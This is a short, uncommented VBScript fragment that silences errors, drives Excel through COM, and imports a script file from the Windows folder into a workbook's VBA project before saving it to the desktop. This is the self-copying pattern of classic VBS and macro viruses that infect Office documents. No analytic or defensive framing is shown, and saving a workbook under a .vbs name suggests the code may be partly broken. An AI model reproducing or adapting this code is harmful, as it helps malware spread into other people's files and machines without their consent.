on error resume next
set ea=createobject("excel.application")
set es=createobject("excel.sheet")
es.application.workbooks(1).vbproject.vbcomponents.import "C:\WINDOWS\s.vbs"
es.application.workbooks(1).saveas "C:\WINDOWS\Desktop\s.vbs"
